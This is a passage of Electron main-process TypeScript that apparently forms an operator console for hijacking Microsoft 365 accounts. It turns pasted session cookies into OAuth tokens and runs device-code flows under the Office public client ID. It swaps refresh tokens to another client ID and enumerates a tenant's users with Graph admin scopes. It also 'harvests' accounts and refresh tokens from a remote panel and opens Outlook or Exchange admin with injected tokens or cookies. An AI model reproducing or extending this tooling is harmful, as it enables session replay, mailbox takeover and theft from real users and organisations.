  ipcMain.handle('state:set', async (_, state: AppState) => {
    await writeState(state);
    return true;
  });

  ipcMain.handle('state:update', async (_, updates: Partial<AppState>) => {
    const current = await readState();
    const updated = { ...current, ...updates };
    await writeState(updated);
    return updated;
  });

  // SafeStorage encryption (only works when encryption is available)
  ipcMain.handle('safeStorage:encrypt', (_, plaintext: string) => {
    if (!safeStorage.isEncryptionAvailable()) {
      throw new Error('Encryption not available');
    }
    const buffer = safeStorage.encryptString(plaintext);
    return buffer.toString('base64');
  });

  ipcMain.handle('safeStorage:decrypt', (_, ciphertextBase64: string) => {
    if (!safeStorage.isEncryptionAvailable()) {
      throw new Error('Encryption not available');
    }
    const buffer = Buffer.from(ciphertextBase64, 'base64');
    return safeStorage.decryptString(buffer);
  });

  // Proxy API requests (bypass CORS)
  ipcMain.handle('api:request', async (_, options) => {
    const { url, method = 'GET', headers = {}, body, timeoutMs } = options as {
      url: string;
      method?: string;
      headers?: Record<string, string>;
      body?: any;
      timeoutMs?: number;
    };
    const ms = typeof timeoutMs === 'number' && timeoutMs > 0 ? Math.min(timeoutMs, 120000) : 15000;
    let response: Response;
    try {
      response = await fetch(url, {
        method,
        headers: { 'Content-Type': 'application/json', ...headers },
        body: body ? JSON.stringify(body) : undefined,
        signal: timeoutSignal(ms),
      } as any);
    } catch (err: any) {
      const msg = err?.cause?.message || err?.message || String(err);
      throw new Error(`Cannot reach ${url}. Check the panel URL is correct and the server is running. (${msg})`);
    }
    const text = await response.text();
    let data: any;
    try { data = JSON.parse(text); } catch { data = text; }
    return {
      ok: response.ok,
      status: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      data,
    };
  });

  // Cookie capture (open a browser window to capture cookies)
  ipcMain.handle('cookies:capture', async (_, url: string) => {
    dlog('Cookie capture requested for', url);
    return new Promise((resolve, reject) => {
      let captureWindow: BrowserWindow | null = null;
      const parsedUrl = new URL(url);
      const domain = parsedUrl.hostname;

      // Create a browser window (not hidden, so user can log in)
      captureWindow = new BrowserWindow({
        width: 800,
        height: 600,
        show: true,
        title: `Cookie Capture - ${domain}`,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          partition: `capture-${Date.now()}`,
        },
      });

      // Capture cookies after page loads and a short delay
      let captured = false;
      let autoCaptureTimer: NodeJS.Timeout | null = null;
      let loadCaptureTimer: NodeJS.Timeout | null = null;

      const cleanup = () => {
        if (autoCaptureTimer) clearTimeout(autoCaptureTimer);
        if (loadCaptureTimer) clearTimeout(loadCaptureTimer);
        autoCaptureTimer = null;
        loadCaptureTimer = null;
      };

      const capture = () => {
        if (captured) return;
        captured = true;
        cleanup(); // clear pending timers
        const ses = captureWindow?.webContents.session;
        ses?.cookies.get({ domain })
          .then(cookies => {
            const cookieStrings = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            // Close window
            if (captureWindow && !captureWindow.isDestroyed()) {
              captureWindow.close();
              captureWindow = null;
            }
            resolve({ success: true, cookies: cookieStrings, message: 'Cookies captured' });
          })
          .catch(err => {
            if (captureWindow && !captureWindow.isDestroyed()) captureWindow.close();
            reject(new Error(`Failed to get cookies: ${err.message}`));
          });
      };

      // Capture after 3 minutes automatically (allow user time to log in)
      autoCaptureTimer = setTimeout(capture, 180000);

      // Also capture when page finishes loading (but wait a bit more)
      captureWindow.webContents.on('did-finish-load', () => {
        if (loadCaptureTimer) clearTimeout(loadCaptureTimer);
        loadCaptureTimer = setTimeout(capture, 2000); // extra 2 seconds after load
      });

      // If user closes window before capture, reject
      captureWindow.on('closed', () => {
        captureWindow = null;
        if (!captured) {
          cleanup();
          reject(new Error('Cookie capture window closed by user'));
        }
      });

      // Navigate to the URL
      captureWindow.loadURL(url).catch(err => {
        cleanup();
        if (captureWindow && !captureWindow.isDestroyed()) captureWindow.close();
        reject(new Error(`Failed to load URL: ${err.message}`));
      });
    });
  });

  // Cookie → token: apply cookies + OAuth authorize (PKCE) + capture code + token exchange
  ipcMain.handle(
    'cookies:exchangeToken',
    async (
      _,
      cookiesRaw: string,
      email?: string,
      opts?: { clientId?: string; authority?: string; redirectUri?: string; showWindow?: boolean }
    ) => {
      dlog('[CookieExchange] Starting for', email || 'unknown', 'paste length', cookiesRaw?.length ?? 0);
      try {
        const store = await readStore();
        const settings = store.settings || {};
        const ms = settings.microsoftOAuth || {};
        const clientId =
          (opts?.clientId && opts.clientId.trim()) ||
          (typeof ms.clientId === 'string' && ms.clientId.trim()) ||
          'd3590ed6-52b3-4102-aeff-aad2292ab01c';
        const authority =
          (opts?.authority && opts.authority.trim()) ||
          (typeof ms.tenantId === 'string' && ms.tenantId.trim()) ||
          'common';
        const redirectUri =
          (opts?.redirectUri && opts.redirectUri.trim()) ||
          (typeof ms.redirectUri === 'string' && ms.redirectUri.trim()) ||
          'https://outlook.office.com/mail/';
        const showWindow = opts?.showWindow !== false;
        return await runCookieToTokenConversion({
          rawPaste: cookiesRaw,
          emailHint: email,
          clientId,
          authority,
          redirectUri,
          showWindow,
        });
      } catch (error: any) {
        console.error('[CookieExchange] failed:', error);
        return {
          success: false,
          error: error?.message || 'Unknown error during token exchange',
        };
      }
    }
  );

  // Device code flow for EWS-scoped tokens (direct, no panel)
  ipcMain.handle('oauth:deviceCode', async (_, clientId?: string, authority?: string) => {
    dlog('[OAuth] Starting device code flow for EWS scope');

    const useClientId = clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const useAuthority = authority || 'common';
    const ewsScope = 'https://outlook.office.com/EWS.AccessAsUser.All offline_access';

    try {
      // Generate device code
      const deviceCodeResponse = await fetch(`https://login.microsoftonline.com/${useAuthority}/oauth2/v2.0/devicecode`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: useClientId,
          scope: ewsScope,
          prompt: 'consent'  // Show permissions screen clearly
        }),
        signal: timeoutSignal(15000),
      } as any);

      if (!deviceCodeResponse.ok) {
        const error = await deviceCodeResponse.json();
        throw new Error(`Device code request failed: ${error.error_description || deviceCodeResponse.status}`);
      }

      const deviceCodeData = await deviceCodeResponse.json();

      // Fix verification URI (microsoft.com/devicelogin)
      let verificationUri = deviceCodeData.verification_uri;
      verificationUri = verificationUri.replace('login.microsoft.com/device', 'microsoft.com/devicelogin');

      dlog('[OAuth] Device code generated');
      return {
        success: true,
        userCode: deviceCodeData.user_code,
        deviceCode: deviceCodeData.device_code,
        verificationUri,
        expiresIn: deviceCodeData.expires_in,
        interval: deviceCodeData.interval,
        message: deviceCodeData.message,
        scope: ewsScope
      };
    } catch (error: any) {
      console.error('[OAuth] Device code generation failed:', error);
      return {
        success: false,
        error: error.message || 'Device code generation failed'
      };
    }
  });

  /**
   * Device-code flow that requests Microsoft Graph **admin** scopes
   * (Directory.Read.All + User.Read.All) so we can enumerate the tenant's
   * user directory. Distinct from `oauth:deviceCode` (EWS scope only).
   *
   * This requires a global admin to consent. Non-admin sign-ins will fail
   * at the consent screen with a clear AAD error which we surface verbatim.
   */
  ipcMain.handle('oauth:deviceCodeAdminScope', async (_, clientId?: string, authority?: string) => {
    dlog('[OAuth] Starting device code flow for Graph admin scope');
    const useClientId = clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const useAuthority = authority || 'common';
    // Directory.Read.All gives richer enumeration (groups, license info, etc.)
    // per the user's preference. User.Read.All would also work for just /users.
    const adminScope = 'https://graph.microsoft.com/Directory.Read.All https://graph.microsoft.com/User.Read.All offline_access';
    try {
      const deviceCodeResponse = await fetch(
        `https://login.microsoftonline.com/${useAuthority}/oauth2/v2.0/devicecode`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: useClientId,
            scope: adminScope,
            prompt: 'consent',
          }),
          signal: timeoutSignal(15000),
        } as any
      );
      if (!deviceCodeResponse.ok) {
        const error = await deviceCodeResponse.json();
        throw new Error(`Device code request failed: ${error.error_description || deviceCodeResponse.status}`);
      }
      const deviceCodeData = await deviceCodeResponse.json();
      let verificationUri = deviceCodeData.verification_uri;
      verificationUri = verificationUri.replace('login.microsoft.com/device', 'microsoft.com/devicelogin');
      return {
        success: true,
        userCode: deviceCodeData.user_code,
        deviceCode: deviceCodeData.device_code,
        verificationUri,
        expiresIn: deviceCodeData.expires_in,
        interval: deviceCodeData.interval,
        message: deviceCodeData.message,
        scope: adminScope,
      };
    } catch (error: any) {
      console.error('[OAuth] Admin device code generation failed:', error);
      return { success: false, error: error.message || 'Device code generation failed' };
    }
  });

  /**
   * Enumerate users via Microsoft Graph using a stored admin-scope refresh
   * token. Returns ALL pages (follows @odata.nextLink). Each user object
   * includes id, displayName, mail, userPrincipalName.
   */
  ipcMain.handle(
    'graphAdmin:listUsers',
    async (
      _,
      adminRefreshToken: string,
      authority?: string,
      clientId?: string
    ) => {
      const useClientId = clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
      const useAuthority = authority || 'common';
      try {
        // Exchange refresh -> access for graph admin scope.
        const tokenRes = await fetch(
          `https://login.microsoftonline.com/${useAuthority}/oauth2/v2.0/token`,
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
              grant_type: 'refresh_token',
              refresh_token: adminRefreshToken,
              client_id: useClientId,
              scope: 'https://graph.microsoft.com/.default offline_access',
            }),
            signal: timeoutSignal(20000),
          } as any
        );
        if (!tokenRes.ok) {
          const err = await tokenRes.json().catch(() => ({}));
          if (err.error === 'invalid_grant') {
            return { success: false, error: 'REFRESH_TOKEN_EXPIRED', code: 'REFRESH_TOKEN_EXPIRED' };
          }
          return { success: false, error: err.error_description || `HTTP ${tokenRes.status}` };
        }
        const tokenData = await tokenRes.json();
        const accessToken: string = tokenData.access_token;
        const newRefresh: string | undefined = tokenData.refresh_token;

        const users: Array<{ id: string; mail?: string; userPrincipalName?: string; displayName?: string }> = [];
        let nextLink = `https://graph.microsoft.com/v1.0/users?$select=id,mail,userPrincipalName,displayName&$top=999`;
        let page = 0;
        while (nextLink && page < 50) {
          const pageRes = await fetch(nextLink, {
            method: 'GET',
            headers: { Authorization: `Bearer ${accessToken}` },
            signal: timeoutSignal(30000),
          } as any);
          if (!pageRes.ok) {
            const errText = await pageRes.text().catch(() => '');
            return {
              success: false,
              error: `Graph /users failed: HTTP ${pageRes.status} ${errText.slice(0, 200)}`,
            };
          }
          const pageData = await pageRes.json();
          const value: any[] = Array.isArray(pageData?.value) ? pageData.value : [];
          for (const u of value) {
            users.push({
              id: u.id,
              mail: u.mail || undefined,
              userPrincipalName: u.userPrincipalName || undefined,
              displayName: u.displayName || undefined,
            });
          }
          nextLink = typeof pageData['@odata.nextLink'] === 'string' ? pageData['@odata.nextLink'] : '';
          page++;
        }
        return { success: true, users, count: users.length, refreshTokenRotated: newRefresh };
      } catch (error: any) {
        return { success: false, error: error?.message || String(error) };
      }
    }
  );

  // Poll for token from device code
  ipcMain.handle('oauth:pollToken', async (_, deviceCode: string, clientId?: string, authority?: string) => {
    dlog('[OAuth] Polling for token');

    const useClientId = clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
    const useAuthority = authority || 'common';

    try {
      const tokenResponse = await fetch(`https://login.microsoftonline.com/${useAuthority}/oauth2/v2.0/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          device_code: deviceCode,
          client_id: useClientId
        }),
        signal: timeoutSignal(30000),
      } as any);

      if (!tokenResponse.ok) {
        const error = await tokenResponse.json();
        if (error.error === 'authorization_pending') {
          return {
            success: false,
            pending: true,
            error: 'authorization_pending',
            message: 'User has not yet completed authorization'
          };
        }
        if (error.error === 'slow_down') {
          return {
            success: false,
            slowDown: true,
            error: 'slow_down',
            message: 'Polling too fast, slow down'
          };
        }
        if (error.error === 'expired_token') {
          return {
            success: false,
            expired: true,
            error: 'expired_token',
            message: 'Device code expired'
          };
        }
        throw new Error(`Token poll failed: ${error.error_description || tokenResponse.status}`);
      }

      const tokenData = await tokenResponse.json();

      dlog('[OAuth] Token obtained successfully');
      dlog('[OAuth] Token keys:', Object.keys(tokenData));
      dlog('[OAuth] Has refresh_token:', !!tokenData.refresh_token);
      dlog('[OAuth] Has id_token:', !!tokenData.id_token);
      dlog('[OAuth] Scope:', tokenData.scope);

      // Determine appropriate default scope based on client ID
      let defaultScope = 'https://outlook.office.com/EWS.AccessAsUser.All offline_access';
      if (useClientId === '9199bf20-a13f-4107-85dc-02114787ef48') {
        defaultScope = 'https://outlook.office.com/.default openid profile offline_access';
      }

      return {
        success: true,
        accessToken: tokenData.access_token,
        refreshToken: tokenData.refresh_token,
        idToken: tokenData.id_token,
        expiresIn: tokenData.expires_in,
        tokenType: tokenData.token_type || 'Bearer',
        scope: tokenData.scope || defaultScope
      };
    } catch (error: any) {
      console.error('[OAuth] Token poll failed:', error);
      return {
        success: false,
        error: error.message || 'Token poll failed'
      };
    }
  });

  // Test token exchange: attempt to acquire v2-Graph token using HighHopes client ID
  ipcMain.handle('test:tokenExchange', async (_, accountId: string) => {
    dlog('[TokenExchange] Testing v1->v2 token exchange for account', accountId);
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const account = accounts.find(a => a.id === accountId);
      if (!account) throw new Error('Account not found');
      if (account.auth?.type !== 'token') throw new Error('Account does not have token auth');

      const { refreshToken, authorityEndpoint } = account.auth;
      if (!refreshToken) throw new Error('No refresh token available');

      const highHopesClientId = '9199bf20-a13f-4107-85dc-02114787ef48';
      const authority = authorityEndpoint || 'common';
      const v2Scopes = 'https://outlook.office.com/.default openid profile offline_access';

      dlog('[TokenExchange] Attempting exchange with client ID', highHopesClientId.substring(0, 8), '...');

      const endpoint = `https://login.microsoftonline.com/${authority}/oauth2/v2.0/token`;
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000);

      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'refresh_token',
            refresh_token: refreshToken,
            client_id: highHopesClientId,
            scope: v2Scopes,
          }),
          signal: controller.signal,
        } as any);
        clearTimeout(timeoutId);

        if (!response.ok) {
          const data = await response.json().catch(() => ({}));
          dlog('[TokenExchange] Exchange failed:', data);
          return {
            success: false,
            error: data.error || 'exchange_failed',
            errorDescription: data.error_description || `HTTP ${response.status}`,
          };
        }

        const data = await response.json();
        dlog('[TokenExchange] Exchange succeeded!');
        dlog('[TokenExchange] Keys returned:', Object.keys(data));
        dlog('[TokenExchange] Has id_token:', !!data.id_token);

        return {
          success: true,
          accessToken: data.access_token,
          refreshToken: data.refresh_token,
          idToken: data.id_token,
          expiresIn: data.expires_in,
          tokenType: data.token_type || 'Bearer',
          scope: data.scope,
        };
      } catch (err: any) {
        clearTimeout(timeoutId);
        throw err;
      }
    } catch (error: any) {
      console.error('[TokenExchange] Exchange test failed:', error);
      return {
        success: false,
        error: 'exchange_test_failed',
        errorDescription: error.message || 'Unknown error',
      };
    }
  });

  // Test device-code flow with HighHopes client ID
  ipcMain.handle('test:deviceCodeHighHopes', async () => {
    dlog('[DeviceCodeTest] Testing device-code flow with HighHopes client ID');
    const clientId = '9199bf20-a13f-4107-85dc-02114787ef48';
    const authority = 'common';
    const scopes = 'https://outlook.office.com/.default openid profile offline_access';

    try {
      const response = await fetch(`https://login.microsoftonline.com/${authority}/oauth2/v2.0/devicecode`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: clientId,
          scope: scopes,
          prompt: 'consent'
        }),
        signal: timeoutSignal(15000),
      } as any);

      if (!response.ok) {
        const error = await response.json();
        dlog('[DeviceCodeTest] Device code request failed:', error);
        return {
          success: false,
          error: error.error || 'devicecode_failed',
          errorDescription: error.error_description || `HTTP ${response.status}`,
        };
      }

      const data = await response.json();
      dlog('[DeviceCodeTest] Device code generated successfully');
      // Don't return full data (contains user_code etc.) to avoid accidental exposure
      return {
        success: true,
        clientId: clientId.substring(0, 8) + '...',
        verificationUri: data.verification_uri?.replace('login.microsoft.com/device', 'microsoft.com/devicelogin'),
        message: data.message?.substring(0, 100),
      };
    } catch (error: any) {
      console.error('[DeviceCodeTest] Device code test failed:', error);
      return {
        success: false,
        error: 'devicecode_test_failed',
        errorDescription: error.message || 'Unknown error',
      };
    }
  });

  // Device-code flow with HighHopes client ID (v2 scopes for OWA)
  ipcMain.handle('oauth:deviceCodeHighHopes', async () => {
    dlog('[OAuth] Starting device-code flow for HighHopes client ID (v2 scopes)');
    const clientId = '9199bf20-a13f-4107-85dc-02114787ef48';
    const authority = 'common';
    const scopes = 'https://outlook.office.com/.default openid profile offline_access';

    try {
      const response = await fetch(`https://login.microsoftonline.com/${authority}/oauth2/v2.0/devicecode`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: clientId,
          scope: scopes,
          prompt: 'consent'
        }),
        signal: timeoutSignal(15000),
      } as any);

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Device code request failed: ${error.error_description || response.status}`);
      }

      const data = await response.json();
      // Fix verification URI
      let verificationUri = data.verification_uri;
      verificationUri = verificationUri.replace('login.microsoft.com/device', 'microsoft.com/devicelogin');

      dlog('[OAuth] HighHopes device code generated');
      return {
        success: true,
        userCode: data.user_code,
        deviceCode: data.device_code,
        verificationUri,
        expiresIn: data.expires_in,
        interval: data.interval,
        message: data.message,
        scope: scopes,
        clientId,
      };
    } catch (error: any) {
      console.error('[OAuth] HighHopes device code generation failed:', error);
      return {
        success: false,
        error: error.message || 'Device code generation failed'
      };
    }
  });

  // Admin harvest (fetch associated accounts from admin console)
  ipcMain.handle('admin:harvest', async (_, accountId: string) => {
    dlog('Admin harvest requested for account', accountId);
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const panels: any[] = store.panels || [];
      const account = accounts.find(a => a.id === accountId);
      if (!account) throw new Error('Account not found');
      const panel = panels.find(p => p.id === account.panelId);
      if (!panel) throw new Error('Panel not found');
      if (!panel.token) throw new Error('Panel not authenticated');

      // Call panel API endpoint for associated accounts
      const endpoint = `${panel.url}/api/admin/associated-accounts`;
      const response = await fetch(endpoint, {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${panel.token}`,
          'Content-Type': 'application/json',
        },
        signal: timeoutSignal(15000),
      } as any);
      if (!response.ok) {
        throw new Error(`Panel API returned ${response.status}: ${await response.text()}`);
      }
      const data = await response.json();
      // Assume data.accounts is an array of account objects with email, auth, etc.
      const associated = data.accounts || [];
      // Transform to expected format
      const result = associated.map((acc: any) => ({
        email: acc.email,
        panelId: panel.id,
        status: acc.status || 'active',
        auth: acc.auth || { type: 'token', clientId: acc.clientId, authorityEndpoint: acc.authorityEndpoint, refreshToken: acc.refreshToken },
      }));
      return result;
    } catch (error) {
      console.error('Admin harvest failed:', error);
      // Return empty array as fallback (could also re-throw)
      return [];
    }
  });

  // Open mailbox in browser
  ipcMain.handle('mailbox:open', async (_, accountId: string) => {
    dlog('Open mailbox for account', accountId);
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const panels: any[] = store.panels || [];
      const account = accounts.find(a => a.id === accountId);
      if (!account) throw new Error('Account not found');
      const panel = panels.find(p => p.id === account.panelId);
      if (!panel) throw new Error('Panel not found');
      if (!panel.token) throw new Error('Panel not authenticated');

      // Construct mailbox URL (admin panel mailbox page)
      const baseUrl = panel.url.replace(/\/$/, '');
      const mailboxUrl = `${baseUrl}/admin/mailbox/${encodeURIComponent(account.email)}`;
      dlog('Opening mailbox URL:', mailboxUrl);

      // Create a browser window with Authorization header, persistent session per panel
      const mailboxWindow = new BrowserWindow({
        width: 1200,
        height: 800,
        show: true,
        title: `Mailbox - ${account.email}`,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          partition: `persist:panel-${panel.id}`,
        },
      });

      // Set extra headers
      mailboxWindow.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
        details.requestHeaders['Authorization'] = `Bearer ${panel.token}`;
        callback({ requestHeaders: details.requestHeaders });
      });

      // Load the mailbox URL
      await mailboxWindow.loadURL(mailboxUrl);
      return { success: true };
    } catch (error: any) {
      console.error('Failed to open mailbox:', error);
      throw new Error(error?.message || String(error));
    }
  });

  /** Open the linked panel's admin UI (org mailboxes / network), not a single-mailbox view. */
  ipcMain.handle('panel:openAdmin', async (_, accountId: string) => {
    dlog('Open panel admin for account', accountId);
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const panels: any[] = store.panels || [];
      const account = accounts.find((a: any) => a.id === accountId);
      if (!account) throw new Error('Account not found');
      const panel = panels.find((p: any) => p.id === account.panelId);
      if (!panel) throw new Error('Panel not found');
      if (!panel.token) throw new Error('Panel not authenticated');

      const baseUrl = panel.url.replace(/\/$/, '');
      const adminUrl = `${baseUrl}/admin`;
      dlog('Opening panel admin URL:', adminUrl);

      const adminWindow = new BrowserWindow({
        width: 1280,
        height: 860,
        show: true,
        title: `Admin - ${panel.name}`,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          partition: `persist:panel-${panel.id}`,
        },
      });

      adminWindow.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
        details.requestHeaders['Authorization'] = `Bearer ${panel.token}`;
        callback({ requestHeaders: details.requestHeaders });
      });

      await adminWindow.loadURL(adminUrl);
      return { success: true };
    } catch (error: any) {
      console.error('Failed to open panel admin:', error);
      throw new Error(error?.message || String(error));
    }
  });

  /**
   * Open any path under the linked panel origin with the same Bearer session as Panel Admin
   * (e.g. admin/connectors, admin/smtp). Prevents ".." and off-origin URLs.
   */
  ipcMain.handle('panel:openPath', async (_, accountId: string, relativePath: string) => {
    dlog('Open panel path for account', accountId, relativePath);
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      const panels: any[] = store.panels || [];
      const account = accounts.find((a: any) => a.id === accountId);
      if (!account) throw new Error('Account not found');
      const panel = panels.find((p: any) => p.id === account.panelId);
      if (!panel) throw new Error('Panel not found');
      if (!panel.token) throw new Error('Panel not authenticated');

      const baseUrl = panel.url.replace(/\/$/, '');
      let rel = String(relativePath || '').trim().replace(/^\/+/, '');
      if (!rel) throw new Error('Path required');
      if (/\.\.|%2e%2e/i.test(rel)) throw new Error('Invalid path');

      const targetUrl = `${baseUrl}/${rel}`;
      let parsed: URL;
      try {
        parsed = new URL(targetUrl);
      } catch {
        throw new Error('Invalid URL');
      }
      const baseOrigin = new URL(baseUrl).origin;
      if (parsed.origin !== baseOrigin) {
        throw new Error('Path must stay under the panel server');
      }

      const title = `${panel.name} - ${rel}`;

      const win = new BrowserWindow({
        width: 1280,
        height: 860,
        show: true,
        title,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          partition: `persist:panel-${panel.id}`,
        },
      });

      win.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
        details.requestHeaders['Authorization'] = `Bearer ${panel.token}`;
        callback({ requestHeaders: details.requestHeaders });
      });

      await win.loadURL(targetUrl);
      return { success: true };
    } catch (error: any) {
      console.error('Failed to open panel path:', error);
      throw new Error(error?.message || String(error));
    }
  });

  // Open Outlook web UI with token injection (or Exchange Admin Center when mode=exchangeAdmin)
  ipcMain.handle(
    'mailbox:openOutlook',
    async (
      _,
      accountId: string,
      options?: { mode?: 'owa' | 'exchangeAdmin'; authPreference?: 'token' | 'cookie' }
    ) => {
    const mode = options?.mode === 'exchangeAdmin' ? 'exchangeAdmin' : 'owa';
    dlog('Open Outlook UI for account', accountId, 'mode=', mode);
    appendOutlookDebug(`[Outlook] Open requested account=${accountId} mode=${mode}`);
    try {
      const storeData = await readStore();
      const accountsList = (storeData.accounts || []) as any[];
      const acc = accountsList.find((a: any) => a.id === accountId);
      if (!acc?.email) throw new Error('Account not found');

      const useCookiesPath = acc.auth?.type === 'cookie' || options?.authPreference === 'cookie';

      if (useCookiesPath) {
        const paste = getMicrosoftCookiePasteFromAccount(acc);
        if (!paste) {
          throw new Error(
            'OWA cookie mode needs stored Microsoft session cookies. Add cookies to this account with Add Account -> Cookie, or use a token account for OAuth.'
          );
        }
        await openOwaWithCookieSession(accountId, acc, paste, mode);
        appendOutlookDebug(`[OutlookCookie] Window opened (cookie session) account=${accountId}`);
        return { success: true as const, session: 'cookie' as const };
      }

      const bundle = await loadOwaTokenBundle(accountId);
      const { account, accessToken, tokenResult, clientIdOverride, tokenPayload } = bundle;

      dlog('[Outlook] Access token obtained, expires in', tokenResult.expiresIn, 'seconds');
      appendOutlookDebug(`[Outlook] Access token acquired exp_in=${tokenResult.expiresIn}s`);

      const partitionName = `persist:outlook-${accountId}`;
      const outlookSession = session.fromPartition(partitionName);

      applyOwaTokenBundleToRunningSession(accountId, bundle, outlookSession);
      owaLastSuccessfulRefresh.set(accountId, Date.now());

      try {
        if (accessToken.split('.').length === 3) {
          dlog('[Outlook] Token payload:', {
            appid: tokenPayload.appid || tokenPayload.azp,
            aud: tokenPayload.aud,
            scp: tokenPayload.scp,
            roles: tokenPayload.roles,
            iss: tokenPayload.iss,
            oid: tokenPayload.oid,
            tid: tokenPayload.tid,
            exp: tokenPayload.exp ? new Date(tokenPayload.exp * 1000).toISOString() : undefined,
          });
        }
      } catch (err) {
        console.warn('[Outlook] Failed to decode token for logging:', err);
      }
      dlog('[Outlook] Token scope from refresh:', tokenResult.scope);

      const state = await readState();
      if (state.owaClientId) {
        dlog('[MAIN] owaClientId loaded from state:', state.owaClientId);
      }
      dlog('[MAIN] MSAL cache clientId:', clientIdOverride);
      dlog('[DEBUG] Before generateMsalCache');
      dlog('[Outlook] MSAL cache generated, entries:', Object.keys(msalCacheMap.get(accountId) || {}).length);
      dlog('[DEBUG] Cache keys:', Object.keys(msalCacheMap.get(accountId) || {}));

      await Promise.all([
        outlookSession.cookies.set({
          url: 'https://outlook.office.com',
          name: 'DefaultAnchorMailbox',
          value: `UPN:${account.email}`,
          domain: '.outlook.office.com',
          path: '/',
          secure: true,
          httpOnly: true,
          sameSite: 'no_restriction',
        }),
        outlookSession.cookies.set({
          url: 'https://login.microsoftonline.com',
          name: 'DefaultAnchorMailbox',
          value: `UPN:${account.email}`,
          domain: '.login.microsoftonline.com',
          path: '/',
          secure: true,
          httpOnly: true,
          sameSite: 'no_restriction',
        }),
      ]);
      dlog('[Outlook] DefaultAnchorMailbox cookies set (parallel)');

      const startUrl =
        mode === 'exchangeAdmin'
          ? 'https://admin.exchange.microsoft.com/'
          : await applyOwaDisplayLanguage('https://outlook.office.com/mail/inbox');
      const windowTitle =
        mode === 'exchangeAdmin' ? `Exchange admin - ${account.email}` : `Outlook - ${account.email}`;

      // Duplicate window prevention
      const windowKey = `${accountId}:${mode}`;
      const existing = outlookWindows.get(windowKey);
      if (existing && !existing.isDestroyed()) {
        existing.focus();
        if (existing.isMinimized()) existing.restore();
        return { success: true, reused: true };
      }

      // Create browser window. `sandbox: false` matches the main window so the
      // preload (preload-mailbox.js) can use Node-style ipcRenderer to fetch
      // the MSAL cache, and so that internal pop-ups inherit the same
      // privileges instead of failing silently.
      const outlookWindow = new BrowserWindow({
        width: 1400,
        height: 900,
        show: true,
        title: windowTitle,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: false,
          partition: partitionName,
          preload: path.join(__dirname, 'preload-mailbox.js'),
          sandbox: false,
        },
      });

      // Allow Microsoft sign-in / compose pop-ups to open as additional
      // BrowserWindows (instead of being blocked by the default deny). Route
      // anything else to the system browser. Without this, OWA's MFA / "sign
      // back in" challenges either spin forever or end up looking like the
      // user has been signed out.
      outlookWindow.webContents.setWindowOpenHandler(({ url }) => {
        try {
          const u = new URL(url);
          const allowedHosts = [
            'outlook.office.com',
            'outlook.office365.com',
            'outlook.cloud.microsoft',
            'login.microsoftonline.com',
            'login.windows.net',
            'admin.exchange.microsoft.com',
            'admin.microsoft.com',
            'm365.cloud.microsoft',
          ];
          const isInternal =
            allowedHosts.includes(u.hostname) ||
            u.hostname.endsWith('.office.com') ||
            u.hostname.endsWith('.office365.com') ||
            u.hostname.endsWith('.exchange.microsoft.com') ||
            u.hostname.endsWith('.cloud.microsoft');
          if (isInternal) {
            appendOutlookDebug(`[Outlook] Allowing internal popup: ${url}`);
            return {
              action: 'allow',
              overrideBrowserWindowOptions: {
                width: 1024,
                height: 768,
                webPreferences: {
                  partition: partitionName,
                  contextIsolation: false,
                  nodeIntegration: false,
                  sandbox: false,
                  preload: path.join(__dirname, 'preload-mailbox.js'),
                },
              },
            };
          }
          appendOutlookDebug(`[Outlook] Routing external link to system browser: ${url}`);
          shell.openExternal(url).catch(() => {});
        } catch (err) {
          console.error('[Outlook] Failed to process window-open:', err);
        }
        return { action: 'deny' };
      });

      // Map window to account for MSAL cache injection
      const windowId = outlookWindow.webContents.id;
      dlog('[Outlook] Mapping window', windowId, 'to account', accountId);
      windowToAccountMap.set(windowId, accountId);
      outlookWindows.set(windowKey, outlookWindow);

      // Generation guard: bump on every open; the close handler captures this
      // value and only runs cleanup if it's still the latest generation.
      const myGeneration = (outlookWindowGeneration.get(windowKey) || 0) + 1;
      outlookWindowGeneration.set(windowKey, myGeneration);

      const OWA_REFRESH_INTERVAL_MS = 18 * 60 * 1000;
      const owaRefreshTimer = setInterval(() => {
        if (outlookWindow.isDestroyed()) {
          clearInterval(owaRefreshTimer);
          return;
        }
        void tryRefreshOwaWindowSession(accountId, outlookSession, outlookWindow.webContents, 0, 'interval');
      }, OWA_REFRESH_INTERVAL_MS);

      // Clean up mapping when this *specific* window closes. Protected by the
      // generation check so a delayed close from an earlier open does not
